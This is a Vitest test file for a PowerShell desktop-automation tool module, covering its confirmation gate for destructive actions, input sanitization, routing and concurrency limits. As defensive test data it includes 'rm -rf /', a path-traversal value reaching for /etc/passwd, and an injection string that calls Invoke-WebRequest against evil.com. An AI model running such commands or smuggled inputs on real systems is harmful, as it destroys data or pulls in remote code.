/**
 * Tests for desktop-tools.ts — PowerShell-based desktop automation.
 *
 * Covers:
 *  1. Concurrency limiter (runPS queuing at PS_MAX_CONCURRENT = 5)
 *  2. DESTRUCTIVE_TOOLS confirmation gate
 *  3. Tool routing via callDesktopTool
 *  4. Input sanitization (sanitizePS)
 *  5. Key conversion (convertKeysToSendKeysSyntax)
 */
import { describe, it, expect, vi, beforeEach, type Mock } from 'vitest';

// ── Hoisted mocks (must be declared before vi.mock calls) ──────────────

const execFileCbs: Array<{
  args: unknown[];
  cb: (err: Error | null, stdout: string, stderr: string) => void;
}> = [];

const hoisted = vi.hoisted(() => ({
  execFile: vi.fn(),
  writeFileSync: vi.fn(),
  unlinkSync: vi.fn(),
  readFile: vi.fn(),
  writeFile: vi.fn(),
  readdir: vi.fn(),
  clipboardReadText: vi.fn().mockReturnValue('clipboard contents'),
  clipboardWriteText: vi.fn(),
  webContentsSend: vi.fn(),
  getSanitizedEnv: vi.fn().mockReturnValue({ PATH: '/usr/bin' }),
  assertSafePath: vi.fn(), // no-op unless test makes it throw
  assertConfinedPath: vi.fn((...args: unknown[]) => args[0]), // returns path unchanged
}));

// ── Module mocks ───────────────────────────────────────────────────────

vi.mock('child_process', () => ({
  execFile: hoisted.execFile,
}));

vi.mock('fs', () => ({
  writeFileSync: hoisted.writeFileSync,
  unlinkSync: hoisted.unlinkSync,
  default: {
    writeFileSync: hoisted.writeFileSync,
    unlinkSync: hoisted.unlinkSync,
  },
}));

vi.mock('fs/promises', () => ({
  readFile: hoisted.readFile,
  writeFile: hoisted.writeFile,
  readdir: hoisted.readdir,
  default: {
    readFile: hoisted.readFile,
    writeFile: hoisted.writeFile,
    readdir: hoisted.readdir,
  },
}));

vi.mock('electron', () => ({
  clipboard: {
    readText: hoisted.clipboardReadText,
    writeText: hoisted.clipboardWriteText,
  },
  BrowserWindow: class FakeBW {},
}));

vi.mock('../../src/main/settings', () => ({
  getSanitizedEnv: hoisted.getSanitizedEnv,
}));

vi.mock('../../src/main/ipc/validate', () => ({
  assertSafePath: hoisted.assertSafePath,
  assertConfinedPath: hoisted.assertConfinedPath,
}));

// ── Import the module under test ───────────────────────────────────────

import {
  callDesktopTool,
  requestConfirmation,
  handleConfirmationResponse,
  setMainWindow,
  DESKTOP_TOOL_DECLARATIONS,
} from '../../src/main/desktop-tools';

// ── Helpers ────────────────────────────────────────────────────────────

/**
 * Configure execFile to call the callback immediately with `stdout`.
 * Optionally set `err`/`stderr` for error cases.
 */
function mockExecFileResolves(stdout = 'ok') {
  hoisted.execFile.mockImplementation(
    (
      _cmd: string,
      _args: string[],
      _opts: unknown,
      cb: (err: Error | null, stdout: string, stderr: string) => void,
    ) => {
      cb(null, stdout, '');
      return { stdin: { end: vi.fn() } };
    },
  );
}

function mockExecFileRejects(message = 'ps error') {
  hoisted.execFile.mockImplementation(
    (
      _cmd: string,
      _args: string[],
      _opts: unknown,
      cb: (err: Error | null, stdout: string, stderr: string) => void,
    ) => {
      cb(new Error(message), '', message);
      return { stdin: { end: vi.fn() } };
    },
  );
}

/**
 * Configure execFile so the callback is NOT called automatically —
 * callers must resolve manually via the returned array.
 * Each invocation pushes a `{ resolve, reject }` handle.
 */
type PendingPS = {
  resolve: (stdout: string) => void;
  reject: (err: string) => void;
};

function mockExecFileManual(): PendingPS[] {
  const pending: PendingPS[] = [];
  hoisted.execFile.mockImplementation(
    (
      _cmd: string,
      _args: string[],
      _opts: unknown,
      cb: (err: Error | null, stdout: string, stderr: string) => void,
    ) => {
      pending.push({
        resolve: (stdout: string) => cb(null, stdout, ''),
        reject: (err: string) => cb(new Error(err), '', err),
      });
      return { stdin: { end: vi.fn() } };
    },
  );
  return pending;
}

/** Create a fake BrowserWindow-like object for confirmation tests. */
function makeFakeWindow() {
  return {
    isDestroyed: vi.fn().mockReturnValue(false),
    webContents: { send: hoisted.webContentsSend },
  } as unknown as import('electron').BrowserWindow;
}

// ── Setup ──────────────────────────────────────────────────────────────

beforeEach(() => {
  vi.clearAllMocks();
  // Default: instant-resolve execFile
  mockExecFileResolves('mock output');
});

// ═══════════════════════════════════════════════════════════════════════
// 1. CONCURRENCY LIMITER
// ═══════════════════════════════════════════════════════════════════════

describe('runPS concurrency limiter', () => {
  /**
   * The concurrency limiter is internal to the module (not exported), but we
   * exercise it through callDesktopTool('list_windows') which invokes runPS.
   * list_windows is a read-only tool — no confirmation gate.
   *
   * Strategy: use manual-resolve execFile so we control when each PS process
   * "completes", letting us observe queuing behaviour.
   */

  it('executes up to 5 calls concurrently', async () => {
    const pending = mockExecFileManual();
    const promises: Promise<unknown>[] = [];

    // Fire 5 calls — all should start immediately
    for (let i = 0; i < 5; i++) {
      promises.push(callDesktopTool('list_windows', {}));
    }

    // All 5 should have invoked execFile
    expect(hoisted.execFile).toHaveBeenCalledTimes(5);

    // Resolve them all
    for (const p of pending) p.resolve('window list');
    await Promise.all(promises);
  });

  it('queues the 6th call until a slot frees up', async () => {
    const pending = mockExecFileManual();
    const promises: Promise<unknown>[] = [];

    // Fire 6 calls
    for (let i = 0; i < 6; i++) {
      promises.push(callDesktopTool('list_windows', {}));
    }

    // Only 5 should have started
    expect(hoisted.execFile).toHaveBeenCalledTimes(5);

    // Resolve the first call — this should drain the queue and start the 6th
    pending[0].resolve('done-0');

    // Wait a tick for drainPsQueue to fire
    await new Promise((r) => setTimeout(r, 0));

    expect(hoisted.execFile).toHaveBeenCalledTimes(6);

    // Resolve remaining
    for (let i = 1; i < pending.length; i++) pending[i].resolve(`done-${i}`);
    await Promise.all(promises);
  });

  it('drains a large queue in FIFO order as slots free', async () => {
    const pending = mockExecFileManual();
    const results: string[] = [];
    const promises: Promise<unknown>[] = [];

    // Fire 10 calls (5 active + 5 queued)
    for (let i = 0; i < 10; i++) {
      const p = callDesktopTool('get_active_window', {}).then((r) => {
        results.push(r.result ?? r.error ?? '');
      });
      promises.push(p);
    }

    expect(hoisted.execFile).toHaveBeenCalledTimes(5);

    // Resolve one at a time and check queue drains
    for (let i = 0; i < 5; i++) {
      pending[i].resolve(`output-${i}`);
      await new Promise((r) => setTimeout(r, 0));
    }

    // After resolving all 5 initial, the 5 queued ones should have started
    expect(hoisted.execFile).toHaveBeenCalledTimes(10);

    // Resolve the remaining 5
    for (let i = 5; i < 10; i++) {
      pending[i].resolve(`output-${i}`);
    }

    await Promise.all(promises);
    expect(results).toHaveLength(10);
  });

  it('frees a slot even when a PS call rejects', async () => {
    const pending = mockExecFileManual();
    const promises: Promise<unknown>[] = [];

    // Fill all 5 slots
    for (let i = 0; i < 5; i++) {
      promises.push(callDesktopTool('list_windows', {}));
    }
    // Queue a 6th
    promises.push(callDesktopTool('list_windows', {}));
    expect(hoisted.execFile).toHaveBeenCalledTimes(5);

    // Reject the first — should still free the slot and drain
    pending[0].reject('simulated failure');
    await new Promise((r) => setTimeout(r, 0));

    expect(hoisted.execFile).toHaveBeenCalledTimes(6);

    // Clean up
    for (let i = 1; i < pending.length; i++) pending[i].resolve('ok');
    await Promise.allSettled(promises);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// 2. DESTRUCTIVE_TOOLS CONFIRMATION GATE
// ═══════════════════════════════════════════════════════════════════════

describe('DESTRUCTIVE_TOOLS confirmation gate', () => {
  const destructiveTools = [
    'run_command',
    'close_window',
    'launch_app',
    'write_clipboard',
    'set_volume',
    'send_keys',
    'write_file',
    'mouse_click',
    'mouse_double_click',
    'mouse_right_click',
    'mouse_move',
    'mouse_scroll',
    'mouse_drag',
    'type_text',
    'press_keys',
  ];

  const readOnlyTools = [
    'list_windows',
    'get_active_window',
    'read_clipboard',
    'focus_window',
    'read_screen',
    'read_file',
    'list_directory',
  ];

  beforeEach(() => {
    mockExecFileResolves('ok');
    hoisted.readFile.mockResolvedValue(Buffer.from('file content'));
    hoisted.readdir.mockResolvedValue([]);
  });

  it.each(readOnlyTools)(
    'does NOT request confirmation for read-only tool "%s"',
    async (toolName) => {
      const win = makeFakeWindow();
      setMainWindow(win);

      await callDesktopTool(toolName, {
        target: 'test',
        file_path: '/tmp/test.txt',
        dir_path: '/tmp',
      });

      // webContents.send should not have been called with a confirm-request
      const confirmCalls = hoisted.webContentsSend.mock.calls.filter(
        (c: unknown[]) => c[0] === 'desktop:confirm-request',
      );
      expect(confirmCalls).toHaveLength(0);
    },
  );

  it.each(destructiveTools)(
    'requests confirmation for destructive tool "%s"',
    async (toolName) => {
      const win = makeFakeWindow();
      setMainWindow(win);

      // The confirmation will time out (no response), so callDesktopTool
      // returns "Action cancelled". We race with a fast timeout.
      const resultPromise = callDesktopTool(toolName, {
        command: 'echo hi',
        target: 'Test',
        keys: 'a',
        text: 'hello',
        level: 50,
        app_name: 'notepad',
        file_path: '/tmp/test.txt',
        content: 'data',
        x: 100,
        y: 100,
        from_x: 0,
        from_y: 0,
        to_x: 100,
        to_y: 100,
        direction: 'up',
        amount: 3,
      });

      // A confirmation request should have been sent
      expect(hoisted.webContentsSend).toHaveBeenCalledWith(
        'desktop:confirm-request',
        expect.objectContaining({ toolName }),
      );

      // Approve it so the promise resolves — echo the challenge back
      const sentPayload = hoisted.webContentsSend.mock.calls[0][1];
      handleConfirmationResponse(sentPayload.id, true, sentPayload.challenge);

      const result = await resultPromise;
      // Should have proceeded (not cancelled)
      expect(result.result).not.toContain('cancelled');
    },
  );

  it('returns cancellation when user denies a destructive tool', async () => {
    const win = makeFakeWindow();
    setMainWindow(win);

    const resultPromise = callDesktopTool('run_command', { command: 'rm -rf /' });

    const sentPayload = hoisted.webContentsSend.mock.calls[0][1];
    handleConfirmationResponse(sentPayload.id, false, sentPayload.challenge);

    const result = await resultPromise;
    expect(result.result).toContain('cancelled');
    expect(result.result).toContain('run_command');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// 3. requestConfirmation + handleConfirmationResponse
// ═══════════════════════════════════════════════════════════════════════

describe('requestConfirmation', () => {
  it('returns false when window is null', async () => {
    const result = await requestConfirmation(null, 'run_command', {});
    expect(result).toBe(false);
  });

  it('returns false when window is destroyed', async () => {
    const win = {
      isDestroyed: vi.fn().mockReturnValue(true),
      webContents: { send: vi.fn() },
    } as unknown as import('electron').BrowserWindow;

    const result = await requestConfirmation(win, 'run_command', {});
    expect(result).toBe(false);
  });

  it('resolves true when handleConfirmationResponse approves', async () => {
    const win = makeFakeWindow();
    const promise = requestConfirmation(win, 'launch_app', { app_name: 'Notepad' });

    const sentPayload = hoisted.webContentsSend.mock.calls[0][1];
    handleConfirmationResponse(sentPayload.id, true, sentPayload.challenge);

    expect(await promise).toBe(true);
  });

  it('resolves false when handleConfirmationResponse denies', async () => {
    const win = makeFakeWindow();
    const promise = requestConfirmation(win, 'launch_app', { app_name: 'Notepad' });

    const sentPayload = hoisted.webContentsSend.mock.calls[0][1];
    handleConfirmationResponse(sentPayload.id, false, sentPayload.challenge);

    expect(await promise).toBe(false);
  });

  it('auto-denies after 30s timeout', async () => {
    vi.useFakeTimers();
    const win = makeFakeWindow();

    const promise = requestConfirmation(win, 'run_command', { command: 'test' });
    vi.advanceTimersByTime(30_000);

    expect(await promise).toBe(false);
    vi.useRealTimers();
  });

  it('ignores a response for an unknown/already-handled ID', () => {
    // Should not throw
    handleConfirmationResponse('nonexistent-id', true);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// 4. TOOL ROUTING
// ═══════════════════════════════════════════════════════════════════════

describe('callDesktopTool routing', () => {
  // For routing tests, bypass the confirmation gate by not setting a main window
  // (requestConfirmation returns false when win is null).
  // For destructive tools we need to approve confirmation, so we set up a window.
  beforeEach(() => {
    mockExecFileResolves('routed output');
    hoisted.readFile.mockResolvedValue(Buffer.from('file data'));
    hoisted.writeFile.mockResolvedValue(undefined);
    hoisted.readdir.mockResolvedValue([]);

    const win = makeFakeWindow();
    setMainWindow(win);
  });

  /** Helper: call a tool and auto-approve any confirmation. */
  async function callAndApprove(
    name: string,
    args: Record<string, unknown>,
  ) {
    const promise = callDesktopTool(name, args);

    // If a confirmation was sent, approve it — echo the challenge back
    const confirmCalls = hoisted.webContentsSend.mock.calls.filter(
      (c: unknown[]) => c[0] === 'desktop:confirm-request',
    );
    if (confirmCalls.length > 0) {
      const payload = confirmCalls[confirmCalls.length - 1][1];
      handleConfirmationResponse(payload.id, true, payload.challenge);
    }

    return promise;
  }

  it('routes list_windows and returns PS output', async () => {
    const result = await callAndApprove('list_windows', {});
    expect(result.result).toBe('routed output');
  });

  it('routes read_clipboard to Electron clipboard', async () => {
    hoisted.clipboardReadText.mockReturnValue('pasted text');
    const result = await callAndApprove('read_clipboard', {});
    expect(result.result).toBe('pasted text');
    expect(hoisted.clipboardReadText).toHaveBeenCalled();
  });

  it('routes write_clipboard to Electron clipboard', async () => {
    const result = await callAndApprove('write_clipboard', { text: 'copy me' });
    expect(hoisted.clipboardWriteText).toHaveBeenCalledWith('copy me');
    expect(result.result).toContain('clipboard');
  });

  it('routes read_file and validates path', async () => {
    hoisted.readFile.mockResolvedValue(Buffer.from('hello world'));
    const result = await callAndApprove('read_file', { file_path: '/tmp/test.txt' });
    expect(hoisted.assertConfinedPath).toHaveBeenCalledWith('/tmp/test.txt', expect.any(String), expect.any(String));
    expect(result.result).toBe('hello world');
  });

  it('routes write_file and validates path', async () => {
    const result = await callAndApprove('write_file', {
      file_path: '/tmp/out.txt',
      content: 'data here',
    });
    expect(hoisted.assertConfinedPath).toHaveBeenCalledWith('/tmp/out.txt', expect.any(String), expect.any(String));
    expect(hoisted.writeFile).toHaveBeenCalledWith('/tmp/out.txt', 'data here', 'utf-8');
    expect(result.result).toContain('/tmp/out.txt');
  });

  it('routes list_directory and validates path', async () => {
    hoisted.readdir.mockResolvedValue([
      { name: 'foo.txt', isDirectory: () => false },
      { name: 'bar', isDirectory: () => true },
    ]);
    const result = await callAndApprove('list_directory', { dir_path: '/tmp' });
    expect(hoisted.assertConfinedPath).toHaveBeenCalledWith('/tmp', expect.any(String), expect.any(String));
    expect(result.result).toContain('[FILE] foo.txt');
    expect(result.result).toContain('[DIR]  bar');
  });

  it('returns error for unknown tool name', async () => {
    const result = await callDesktopTool('nonexistent_tool', {});
    expect(result.error).toContain('Unknown desktop tool');
    expect(result.error).toContain('nonexistent_tool');
  });

  it('routes run_command with 30s timeout', async () => {
    const result = await callAndApprove('run_command', { command: 'Get-Date' });
    expect(result.result).toBeDefined();
    // execFile should have been called with powershell.exe
    expect(hoisted.execFile).toHaveBeenCalledWith(
      'powershell.exe',
      expect.arrayContaining(['-File', expect.any(String)]),
      expect.objectContaining({ timeout: 30000 }),
      expect.any(Function),
    );
  });

  it('routes launch_app through runPS', async () => {
    const result = await callAndApprove('launch_app', { app_name: 'Notepad' });
    expect(result.result).toContain('Launched Notepad');
  });

  it('routes mouse_click through runPS with coordinates', async () => {
    mockExecFileResolves('Clicked at (150, 200)');
    const result = await callAndApprove('mouse_click', { x: 150, y: 200 });
    expect(result.result).toContain('150');
    expect(result.result).toContain('200');
  });

  it('routes get_active_window (read-only, no confirmation)', async () => {
    mockExecFileResolves('My Window Title');
    const result = await callDesktopTool('get_active_window', {});
    expect(result.result).toBe('My Window Title');
  });

  it('read_file returns error when assertConfinedPath throws', async () => {
    hoisted.assertConfinedPath.mockImplementation(() => {
      throw new Error('Path traversal detected');
    });
    const result = await callAndApprove('read_file', { file_path: '../../etc/passwd' });
    expect(result.error).toContain('Path traversal detected');
  });

  it('read_file truncates at 50KB', async () => {
    const bigBuffer = Buffer.alloc(60 * 1024, 'A');
    hoisted.readFile.mockResolvedValue(bigBuffer);
    hoisted.assertConfinedPath.mockImplementation((...args: unknown[]) => args[0]); // reset
    const result = await callAndApprove('read_file', { file_path: '/tmp/big.txt' });
    expect(result.result).toContain('truncated at 50KB');
  });

  it('list_directory returns "(empty directory)" for empty dir', async () => {
    hoisted.readdir.mockResolvedValue([]);
    const result = await callAndApprove('list_directory', { dir_path: '/tmp/empty' });
    expect(result.result).toBe('(empty directory)');
  });

  it('run_command truncates output at 4000 chars', async () => {
    const longOutput = 'X'.repeat(5000);
    mockExecFileResolves(longOutput);
    const result = await callAndApprove('run_command', { command: 'test' });
    expect(result.result!.length).toBeLessThanOrEqual(4100); // 4000 + truncation message
    expect(result.result).toContain('truncated');
  });

  it('read_clipboard returns "(clipboard is empty)" when empty', async () => {
    hoisted.clipboardReadText.mockReturnValue('');
    const result = await callDesktopTool('read_clipboard', {});
    expect(result.result).toBe('(clipboard is empty)');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// 5. INPUT SANITIZATION (sanitizePS)
// ═══════════════════════════════════════════════════════════════════════

describe('sanitizePS (tested indirectly via tool calls)', () => {
  /**
   * sanitizePS is not exported, so we test it indirectly by calling tools
   * that interpolate user input into PS scripts and inspecting what gets
   * written to the temp file via writeFileSync.
   */

  beforeEach(() => {
    mockExecFileResolves('ok');
    const win = makeFakeWindow();
    setMainWindow(win);
  });

  /** Get the script content passed to writeFileSync */
  function getWrittenScript(): string {
    const call = hoisted.writeFileSync.mock.calls[0];
    return call ? String(call[1]) : '';
  }

  /** Helper to call focus_window (read-only, uses sanitizePS on target) */
  async function focusWithInput(input: string) {
    await callDesktopTool('focus_window', { target: input });
    return getWrittenScript();
  }

  it('escapes backticks', async () => {
    const script = await focusWithInput('test`injection');
    // Backtick should be doubled
    expect(script).toContain('test``injection');
    expect(script).not.toContain('test`injection');
  });

  it('escapes dollar signs', async () => {
    const script = await focusWithInput('$env:SECRET');
    // Dollar should become `$
    expect(script).toContain('`$env:SECRET');
  });

  it('escapes single quotes', async () => {
    const script = await focusWithInput("it's a test");
    // Single quote should be doubled
    expect(script).toContain("it''s a test");
  });

  it('escapes double quotes', async () => {
    const script = await focusWithInput('say "hello"');
    // Double quote should become `"
    expect(script).toContain('say `"hello`"');
  });

  it('removes command chaining operators (;, |, &)', async () => {
    const script = await focusWithInput('foo; bar | baz & qux');
    // The sanitized user input should have ;|& stripped, becoming "foo bar  baz  qux".
    // Note: the surrounding PS script itself contains ; and | in its own code, so we
    // verify the sanitized user string appears correctly rather than checking the whole script.
    expect(script).toContain('foo bar  baz  qux');
  });

  it('flattens newlines to spaces', async () => {
    const script = await focusWithInput('line1\nline2\r\nline3');
    expect(script).toContain('line1 line2 line3');
  });

  it('handles combined injection attempt', async () => {
    const malicious = '`$(Invoke-WebRequest http://evil.com)`;rm -rf /';
    const script = await focusWithInput(malicious);
    // After sanitization the dollar sign is escaped to `$ and backticks are doubled.
    // The semicolons are stripped from the user input. Verify by checking
    // the sanitized form appears (backtick-escaped dollar, no raw semicolons in user portion).
    // sanitizePS order: backtick -> ``  then $ -> `$  then ; stripped
    // Input backtick ` -> ``  then $( -> `$(  ... but the backtick was already doubled
    // So the user-portion should contain: ``` `$( ... )`` rm -rf /
    // The key test: the user input should not contain a raw unescaped $( sequence
    // without a preceding backtick escape.
    // Extract the user input portion between the -like '*...*' markers
    const likeMatch = script.match(/-like '\*(.+?)\*'/);
    expect(likeMatch).not.toBeNull();
    const sanitizedInput = likeMatch![1];
    // Dollar signs should be escaped with backtick
    expect(sanitizedInput).not.toMatch(/(?<!`)\$\(/);
    // Semicolons should be stripped from user input
    expect(sanitizedInput).not.toContain(';');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// 6. convertKeysToSendKeysSyntax
// ═══════════════════════════════════════════════════════════════════════

describe('convertKeysToSendKeysSyntax (tested via press_keys tool)', () => {
  /**
   * convertKeysToSendKeysSyntax is not exported, so we test it indirectly
   * through the press_keys tool and inspect the PS script written to disk.
   */

  beforeEach(() => {
    mockExecFileResolves('Pressed: test');
    const win = makeFakeWindow();
    setMainWindow(win);
  });

  function getWrittenScript(): string {
    const call = hoisted.writeFileSync.mock.calls[0];
    return call ? String(call[1]) : '';
  }

  async function pressAndGetScript(keys: string) {
    const promise = callDesktopTool('press_keys', { keys });

    // Approve confirmation (press_keys is destructive) — echo the challenge back
    const confirmCalls = hoisted.webContentsSend.mock.calls.filter(
      (c: unknown[]) => c[0] === 'desktop:confirm-request',
    );
    if (confirmCalls.length > 0) {
      const payload = confirmCalls[confirmCalls.length - 1][1];
      handleConfirmationResponse(payload.id, true, payload.challenge);
    }

    await promise;
    return getWrittenScript();
  }

  it('converts "enter" to {ENTER}', async () => {
    const script = await pressAndGetScript('enter');
    expect(script).toContain('{ENTER}');
  });

  it('converts "ctrl+c" to ^c', async () => {
    const script = await pressAndGetScript('ctrl+c');
    expect(script).toContain("'^c'");
  });

  it('converts "ctrl+shift+s" to ^+s', async () => {
    const script = await pressAndGetScript('ctrl+shift+s');
    expect(script).toContain('^+s');
  });

  it('converts "alt+tab" to %{TAB}', async () => {
    const script = await pressAndGetScript('alt+tab');
    expect(script).toContain('%{TAB}');
  });

  it('converts "alt+f4" to %{F4}', async () => {
    const script = await pressAndGetScript('alt+f4');
    expect(script).toContain('%{F4}');
  });

  it('converts "escape" to {ESC}', async () => {
    const script = await pressAndGetScript('escape');
    expect(script).toContain('{ESC}');
  });

  it('converts "backspace" to {BS}', async () => {
    const script = await pressAndGetScript('backspace');
    expect(script).toContain('{BS}');
  });

  it('converts "f5" to {F5}', async () => {
    const script = await pressAndGetScript('f5');
    expect(script).toContain('{F5}');
  });

  it('passes through already-valid SendKeys syntax', async () => {
    const script = await pressAndGetScript('^{ESC}');
    // Should contain the literal input, not re-mapped
    expect(script).toContain('^{ESC}');
  });

  it('passes through plain characters', async () => {
    const script = await pressAndGetScript('a');
    expect(script).toContain("'a'");
  });
});

// ═══════════════════════════════════════════════════════════════════════
// 7. DESKTOP_TOOL_DECLARATIONS
// ═══════════════════════════════════════════════════════════════════════

describe('DESKTOP_TOOL_DECLARATIONS', () => {
  it('is a non-empty array', () => {
    expect(Array.isArray(DESKTOP_TOOL_DECLARATIONS)).toBe(true);
    expect(DESKTOP_TOOL_DECLARATIONS.length).toBeGreaterThan(0);
  });

  it('every declaration has a name and description', () => {
    for (const decl of DESKTOP_TOOL_DECLARATIONS) {
      expect(decl.name).toBeTruthy();
      expect(typeof decl.name).toBe('string');
      expect(decl.description).toBeTruthy();
      expect(typeof decl.description).toBe('string');
    }
  });

  it('every declaration has a parameters object', () => {
    for (const decl of DESKTOP_TOOL_DECLARATIONS) {
      expect(decl.parameters).toBeDefined();
      expect(decl.parameters.type).toBe('object');
    }
  });

  it('includes all tools handled by callDesktopTool', () => {
    const declaredNames = new Set(DESKTOP_TOOL_DECLARATIONS.map((d) => d.name));
    const allKnownTools = [
      'launch_app', 'list_windows', 'focus_window', 'close_window',
      'set_volume', 'get_active_window', 'run_command', 'read_clipboard',
      'write_clipboard', 'send_keys', 'read_screen', 'read_file',
      'write_file', 'list_directory', 'mouse_click', 'mouse_double_click',
      'mouse_right_click', 'mouse_move', 'mouse_scroll', 'mouse_drag',
      'type_text', 'press_keys', 'get_screen_size', 'get_cursor_position',
    ];
    for (const tool of allKnownTools) {
      expect(declaredNames.has(tool)).toBe(true);
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════
// 8. ERROR HANDLING
// ═══════════════════════════════════════════════════════════════════════

describe('error handling', () => {
  beforeEach(() => {
    const win = makeFakeWindow();
    setMainWindow(win);
  });

  it('returns error object when PowerShell fails (list_windows)', async () => {
    mockExecFileRejects('Access denied');
    const result = await callDesktopTool('list_windows', {});
    expect(result.error).toContain('Access denied');
  });

  it('returns error object when PowerShell fails (launch_app)', async () => {
    mockExecFileRejects('not found');

    const promise = callDesktopTool('launch_app', { app_name: 'FakeApp' });
    const sentPayload = hoisted.webContentsSend.mock.calls[0][1];
    handleConfirmationResponse(sentPayload.id, true, sentPayload.challenge);

    const result = await promise;
    expect(result.error).toContain('not found');
  });

  it('write_file notifies renderer on success', async () => {
    hoisted.writeFile.mockResolvedValue(undefined);

    const promise = callDesktopTool('write_file', {
      file_path: '/tmp/notify.txt',
      content: 'data',
    });
    // Approve the confirmation — echo the challenge back
    const confirmCalls = hoisted.webContentsSend.mock.calls.filter(
      (c: unknown[]) => c[0] === 'desktop:confirm-request',
    );
    const payload = confirmCalls[0][1];
    handleConfirmationResponse(payload.id, true, payload.challenge);

    await promise;

    // Should have sent file:modified
    const modCalls = hoisted.webContentsSend.mock.calls.filter(
      (c: unknown[]) => c[0] === 'file:modified',
    );
    expect(modCalls).toHaveLength(1);
    expect(modCalls[0][1]).toEqual(
      expect.objectContaining({
        path: '/tmp/notify.txt',
        action: 'write',
        size: 4,
      }),
    );
  });

  it('clipboard read error returns error object', () => {
    hoisted.clipboardReadText.mockImplementation(() => {
      throw new Error('Clipboard unavailable');
    });
    // read_clipboard is synchronous under the hood
    // callDesktopTool is async but clipboard path is sync
    return callDesktopTool('read_clipboard', {}).then((result) => {
      expect(result.error).toContain('Clipboard unavailable');
    });
  });
});
